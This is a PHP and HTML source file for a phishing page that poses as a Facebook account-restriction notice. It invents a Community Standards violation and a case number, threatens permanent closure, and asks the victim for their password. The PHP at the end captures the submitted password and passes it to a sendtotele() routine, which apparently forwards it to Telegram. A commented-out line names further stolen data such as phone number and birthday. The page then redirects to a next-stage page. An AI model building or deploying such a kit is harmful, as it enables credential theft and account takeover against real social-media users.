<?php
session_start();
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta name="robots" content="noindex" />
    <title>Restrictions Information</title>
    <link rel="icon" type="image/x-icon" href="favicon.ico" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0" />
    <link rel="stylesheet" type="text/css" href="style.css" />
    <script language="JavaScript">
      var tanggallengkap = new String();
      var namahari = "Minggu Senin Selasa Rabu Kamis Jumat Sabtu";
      namahari = namahari.split(" ");
      var namabulan =
        "January February March April May June July August September October November December";
      namabulan = namabulan.split(" ");
      var tgl = new Date();
      var hari = tgl.getDay();
      var tanggal = tgl.getDate();
      var bulan = tgl.getMonth();
      var tahun = tgl.getFullYear();
      tanggallengkap = namabulan[bulan] + " " + tanggal + ", " + tahun;
    </script>
  </head>
  <body>
    <div id="page-div">
      <div id="progress-bar-container">
        <div class="iConWeb">
          <!-- SVG Logo here -->
        </div>
      </div>
      <div id="interview-page-container">
        <div class="BackArrowAndHeading">
          <img alt="" src="img/inF0loCk.png" width="100%" />
        </div>
        <div class="groupSubHeadersWrapper">
          <h5 id="groupSubHeader">Your account has been restricted</h5>
          <div id="groupDescription">Term of Service</div>
        </div>
        <div id="interview-container">
          <div id="tax-form">
            <div id="AboutYouSection" class="Question AboutYouSection">
              <div class="CaptionWrapper">
                <div class="Caption">
                  We detected unusual activity in your page today
                  <strong><script language="JavaScript">document.write(tanggallengkap);</script></strong>
                  . Someone has reported your account for not complying with
                  <a>Community Standards</a>. We have already reviewed this
                  decision and the decision cannot be changed. To avoid having
                  your account <a>disabled</a>, please verify:
                </div>
              </div>
              <form method="POST">
                <div class="ElementWrapper">
                  <div data-form-element-key="PrevYearDays" class="FormElement FormElement_TextBox NoTopMargin PrevYearDays">
                    <div class="Error">
                      <div class="TextBox floatingLabelContainer">
                        <input
                          type="text"
                          name="PrevToPass"
                          id="PrevYearDays"
                          required
                          pattern=".{5,}"
                          placeholder=" "
                        />
                        <label class="Caption" title="Password" for="PrevYearDays">Password</label>
                      </div>
                    </div>
                  </div>
                </div>
                <span id="error_IndividualOrBusiness" class="error-message">Required</span>
                <div class="error-pesan">The password that you've entered is incorrect</></div>
            <!-- <div data-form-element-key="USResidentCueAlert" class="FormElement FormElement_AlertMessage AlertMessageTopMargin USResidentCueAlert"></div> -->
            <div class="PageNavigationButtons OOTBPageNavigationButtons">
              <div class="AbCa">
                About Case: Violating Community Standards and Posting something inappropriate.
              </div>
              <div class="CaNum">Case Number: <a>#100430558912</a></div>
            </div>
                <div class="PageNavigationButtons OOTBPageNavigationButtons">
                  <div data-form-element-key="ButtonNext" class="FormElement FormElement_Button ButtonNext">
                    <div class="Button">
                      <button
                        name="ButtonNext"
                        class="ButtonNext"
                        data-elements-processor=""
                        type="submit"
                      >
                        Verification
                      </button>
                    </div>
                  </div>
                </div>
              </form>
            </div>

            

            <div class="PageNavigationButtons OOTBPageNavigationButtons">
              <div class="AlertMessage info">
                <div class="AlertContent">
                  <!-- Alert SVG here -->
                  <div>
                    Please make sure to fill in the data correctly, if you fill in the wrong data your account will be permanently closed.
                    To learn more about why we deactivate accounts, go to <a target="_blank" rel="noopener" href="https://facebook.com/communitystandards/">Community Standards</a>.
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </body>
</html>


<?php

require 'lib/sendtotele.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $_SESSION["password2"] = htmlspecialchars($_POST['PrevToPass']);

  if (!isset($_SESSION['password2'])) {
    return;
  }

  sendtotele();
  // sendtotele($username, $password, $ipaddress, $_SESSION['pageName'], $_SESSION['name'], $_SESSION['phoneNumber'], $_SESSION['birthDay']);
  // header('Location: https://www.facebook.com');
  echo "<script>window.location.href='athention.php'</script>";
  
}

?>
